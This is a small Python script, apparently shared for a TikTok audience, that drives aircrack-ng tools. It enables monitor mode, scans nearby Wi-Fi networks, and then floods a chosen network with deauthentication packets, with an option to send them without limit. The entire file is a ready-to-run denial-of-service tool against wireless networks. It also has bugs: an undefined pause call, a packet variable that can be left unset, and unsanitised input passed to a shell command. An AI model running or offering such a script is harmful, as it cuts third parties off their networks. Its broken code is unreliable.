#Code By EnderPlay(For TikTok)
import os, time, getch
x = str(input("Do You Wan't turn on monitor mode? (Y/N) >>"))
if x.lower() == "y":
    os.system("airmon-ng check kill")
    os.system("airmon-ng start wlan0")
if x.lower() == "n":
    pass
x = str(input("Do you wan't see information on nearest wifi? (Y/N) >>"))
if x.lower() == "y":
    print("If you wan't stop click ctrl + c!")
    pause('Press Any Key To continue')
    time.sleep(1)
    print(1)
    time.sleep(1)
    print(2)
    time.sleep(1)
    print(3)
    time.sleep(1)
    print("GO!")
    time.sleep(0.5)
    os.system("airodump-ng wlan0mon")
if x.lower() == "n":
    pass
bssid = str(input("Write mac adress of wifi(BSSID)"))
try:
    packets = int(input("write num of packets! ex. 0 = inf, or 1 - 1000000000"))
except:
    print("i cathed bug!")
os.system("aireplay-ng --deauth {0} -a {1} wlan0mon".format(packets, bssid))
